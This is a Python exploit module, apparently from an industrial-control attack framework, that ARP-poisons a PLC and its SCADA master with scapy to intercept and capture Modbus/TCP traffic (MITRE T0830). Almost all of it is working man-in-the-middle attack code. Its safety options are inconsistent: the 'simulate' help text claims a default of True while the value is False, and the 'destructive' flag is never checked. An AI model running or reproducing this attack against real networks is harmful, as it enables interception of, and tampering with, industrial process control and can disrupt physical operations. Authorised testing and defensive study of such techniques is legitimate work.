"""MITRE T0830 - Adversary-in-the-Middle via ARP Poisoning + Modbus Interception.

This module performs ARP cache poisoning to position the attacker between
a Modbus master and slave, enabling interception and modification of
Modbus traffic (T0830 - Adversary-in-the-Middle).

Requires: scapy (pip install scapy), root/admin privileges.

MITRE ATT&CK for ICS v19: T0830
"""

from industrialxpl.core.exploit import (
    Exploit,
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    DestructiveGate,
)

try:
    import scapy.all as _scapy
    _HAS_SCAPY = True
except ImportError:
    _HAS_SCAPY = False


class Exploit(Exploit):
    __info__ = {
        "name":         "MITRE T0830 Adversary-in-the-Middle - ARP Poison + Modbus Intercept",
        "description":  "Performs ARP cache poisoning to intercept Modbus/TCP traffic between "
                        "a SCADA master and a PLC. Captures Modbus read/write commands and "
                        "can optionally modify values in transit (Manipulation of View T0832). "
                        "Requires scapy and root/admin privileges.",
        "authors":      ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":   (
            "https://attack.mitre.org/techniques/T0830/",
            "https://attack.mitre.org/techniques/T0832/",
        ),
        "devices":      ("Any Modbus/TCP network", "SCADA master + PLC slave"),
        "impact":       "HIGH",
        "exploit_type": "ARP Poisoning + Network Interception",
        "source_poc":   "IXF native (scapy)",
        "cve":          "N/A", "cvss": "N/A", "severity": "HIGH",
        "mitre_techniques": ["T0830", "T0832", "T0842"],
        "mitre_tactics":    ["Collection", "Evasion"],
        "destructive_description": (
            "Will poison ARP caches of {target} (PLC) and {gateway} (SCADA master) "
            "to intercept Modbus traffic. May disrupt communications if not forwarded correctly."
        ),
    }

    target   = OptIP("", "Target PLC IP (Modbus slave)")
    gateway  = OptIP("", "SCADA Master IP (Modbus master to intercept from)")
    port     = OptPort(502, "Modbus TCP port")
    duration = OptInteger(30, "ARP poisoning duration in seconds")
    capture  = OptInteger(100, "Number of Modbus packets to capture")
    simulate = OptBool(False, "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable ARP poisoning (HIGH impact)")

    @mute
    def check(self) -> bool:
        return bool(self.target and self.gateway)

    def run(self) -> None:
        if not self.target or not self.gateway:
            print_error("Set both 'target' (PLC) and 'gateway' (SCADA master) options.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    f"T0830 AiTM: Would ARP-poison {self.target} (PLC) and {self.gateway} (SCADA master) to "
                    f"intercept {self.capture} Modbus packets over {self.duration} seconds. "
                    "Captured Modbus FC1-6 traffic reveals process setpoints and I/O values."
                ),
                payload_human=(
                    f"ARP Spoof: Tell {self.target} that {self.gateway} is at attacker-MAC\n"
                    f"ARP Spoof: Tell {self.gateway} that {self.target} is at attacker-MAC\n"
                    "Forward all TCP:502 packets; capture Modbus PDUs"
                ),
                mitre_techniques=["T0830", "T0832"],
            )
            return

        if not _HAS_SCAPY:
            print_error("scapy required: pip install scapy")
            return

        print_status(f"[T0830] ARP poisoning {self.target} <-> {self.gateway} for {self.duration}s…")
        print_warning("[T0830] This will intercept Modbus traffic. Ensure traffic forwarding.")

        try:
            import os
            import time
            import threading

            target_mac  = _scapy.getmacbyip(self.target)
            gateway_mac = _scapy.getmacbyip(self.gateway)

            if not target_mac or not gateway_mac:
                print_error("Could not resolve MAC for target or gateway.")
                return

            print_info(f"[T0830] Target MAC: {target_mac}  Gateway MAC: {gateway_mac}")

            stop_event = threading.Event()
            captured = []

            def poison():
                pkt_to_target  = _scapy.ARP(op=2, pdst=self.target,  hwdst=target_mac,  psrc=self.gateway)
                pkt_to_gateway = _scapy.ARP(op=2, pdst=self.gateway, hwdst=gateway_mac, psrc=self.target)
                while not stop_event.is_set():
                    _scapy.send(pkt_to_target,  verbose=False)
                    _scapy.send(pkt_to_gateway, verbose=False)
                    time.sleep(2)
                # Restore ARP
                _scapy.send(_scapy.ARP(op=2, pdst=self.target,  hwdst=target_mac,  psrc=self.gateway, hwsrc=gateway_mac), count=3, verbose=False)
                _scapy.send(_scapy.ARP(op=2, pdst=self.gateway, hwdst=gateway_mac, psrc=self.target,  hwsrc=target_mac),  count=3, verbose=False)
                print_info("[T0830] ARP tables restored.")

            def capture_packets(pkt):
                if _scapy.TCP in pkt and (pkt[_scapy.TCP].dport == self.port or pkt[_scapy.TCP].sport == self.port):
                    if _scapy.Raw in pkt and len(pkt[_scapy.Raw].load) >= 8:
                        captured.append(pkt)
                        if len(captured) % 10 == 0:
                            print_info(f"[T0830] Captured {len(captured)} Modbus packets.")
                return len(captured) >= self.capture

            poison_thread = threading.Thread(target=poison, daemon=True)
            poison_thread.start()

            _scapy.sniff(filter=f"tcp port {self.port}",
                         prn=capture_packets,
                         stop_filter=lambda p: len(captured) >= self.capture,
                         timeout=self.duration)

            stop_event.set()
            print_success(f"[T0830] AiTM complete. {len(captured)} Modbus packets captured.")

        except Exception as exc:
            print_error(f"[T0830] Error: {exc}")
